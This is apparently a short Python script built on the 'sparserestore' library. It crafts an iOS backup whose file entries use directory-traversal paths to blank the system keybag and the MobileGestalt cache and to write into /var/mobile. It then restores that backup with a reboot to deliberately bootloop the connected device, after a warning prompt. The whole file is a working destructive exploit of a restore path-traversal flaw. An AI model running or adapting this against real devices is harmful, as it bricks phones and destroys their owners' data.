from sparserestore import backup, perform_restore

def bootloop():
    back = backup.Backup(files=[
        backup.ConcreteFile("", "SysContainerDomain-../../../../../../../../var/keybags/systembag.kb", contents=b""), # dleovl strategy; removing keybags
        backup.ConcreteFile("", "SysContainerDomain-../../../../../../../../var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", contents=b""), # just straight up remove mobilegestalt
        backup.ConcreteFile("", "SysContainerDomain-../../../../../../../../var/backup/var/mobile/bootloop", contents=b"bootloop :3") # iOS 17+ only, bootloops by attempting to write directly to /var/mobile (which is on a different partition)
    ])

    perform_restore(back, reboot=True)

input("This will immediately bootloop the connected device. Like actually.\nIf you are absolutely certain you want to bootloop your device, press Enter. Otherwise, press Ctrl+C to exit this program.")
bootloop()
